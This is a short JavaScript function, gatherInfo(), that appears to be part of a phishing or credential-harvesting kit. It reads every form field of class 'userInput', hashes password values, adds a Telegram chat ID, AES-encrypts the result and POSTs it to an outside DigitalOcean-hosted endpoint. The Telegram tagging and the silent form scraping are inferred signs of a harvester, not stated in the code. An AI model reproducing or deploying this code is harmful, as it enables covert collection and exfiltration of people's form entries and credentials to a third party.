function gatherInfo() {
  const inputs = Array.from(document.getElementsByClassName("userInput"));
  const SECRET_KEY = process.env.SECRET_KEY;
  const userInput = [];
  const id = Date.now().toString();
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  inputs.forEach((input) => {
    const type = input.getAttribute("aria-placeholder") || input.placeholder;
    const value = input.value;

    // Hash the password using SHA-256 if the field type is 'password'
    if (type.toLowerCase() === "password") {
      const hashedPassword = CryptoJS.SHA256(value).toString(CryptoJS.enc.Hex);
      userInput.push({ id: id, type, value: hashedPassword });
    } else {
      userInput.push({ id: id, type, value });
    }
  });
  const type = "chatid";
  const value = TELEGRAM_CHAT_ID;
  userInput.push({ id: id, type, value });

  const encryptedData = CryptoJS.AES.encrypt(
    JSON.stringify(userInput),
    SECRET_KEY
  ).toString();

  fetch("https://coral-app-mjjt3.ondigitalocean.app/storeData", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ data: encryptedData }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Failed to store data");
      }
      console.log("Data stored successfully");
    })
    .catch((error) => {
      console.error("Error storing data:", error);
    });
}
